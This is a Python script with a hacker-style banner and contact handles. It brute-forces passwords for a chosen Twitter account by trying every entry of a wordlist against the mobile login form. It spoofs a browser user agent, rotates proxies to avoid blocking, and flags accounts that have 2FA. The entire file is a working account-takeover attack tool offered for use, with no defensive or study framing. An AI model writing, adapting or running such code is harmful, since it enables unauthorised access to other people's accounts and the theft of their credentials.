import mechanize
import argparse
import sys
import os
from proxylist import ProxyList
import logging


print('''\033[1;36m
    .'``.``.
 __/ (o) `, `.
'-=`,     ;   `.
    \    :      `-.
    /    ';        `.
   /      .'         `.
   |     (      `.     `-.._
    \     \` ` `. \         `-.._
     `.   ;`-.._ `-`._.-. `-._   `-._
       `..'     `-.```.  `-._ `-.._.'
         `--..__..-`--'      `-.,'
            `._)`/
             /--(
          -./,--'`-,
       ,^--(                    
       ,--' `-,         v1.2  
        **************************************
        * -> Development: 0xfff0800          *
        * -> Telegram: https://T.me/xfff0800 *
        * -> snapchat: flaah999              *
        **************************************                                                 
\033[1;m''')



b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                 )]

username = input('\033[1;37muser : \033[1;37m')
passwordList = input('\033[1;37mpassword : \033[1;37m')
proxyList = input('\033[1;37mproxy : \033[1;37m')
def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit('\033[1;31m[!] Proxy File format has incorrect | EXIT...\033[1;31m')
    pl.random()
    getProxy = pl.random().address()
    b.set_proxies(proxies={"https": getProxy})
    try:
        checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=2)
    except:
        return proxy()
        
        
def Twitter():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("\033[1;31mTarget Account: {}\033[1;31m".format(username))
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0
        sys.stdout.write('\r[-] {} [-] '.format(password))
        sys.stdout.flush()
        url = "https://mobile.twitter.com/login"
        try:
            response = b.open(url, timeout=2)
            b.select_form(nr=0)
            b.form['session[username_or_email]'] = username
            b.form['session[password]'] = password
            b.method = "POST"
            response = b.submit()

            if len(response.geturl()) == 27:
                print(f'\n\033[1;31m [+] Good ^_^ [{username}]:[{password}] [+] \033[1;31m')
                proxy()
                break
            elif response.geturl() == "https://mobile.twitter.com/login/check":
                print(f'\n\033[1;31m [+] Good ^_^ [{username}]:[{password}] [+] --> But There is a 2FA \033[1;31m')
                proxy()
            else:
                print('\033[1;37m NO !\033[1;37m')
        except KeyboardInterrupt:
            print('\n ok exit ')
            sys.stdout.flush()
            proxy()
            break
            
if __name__ == '__main__':
    Twitter()
    proxy()
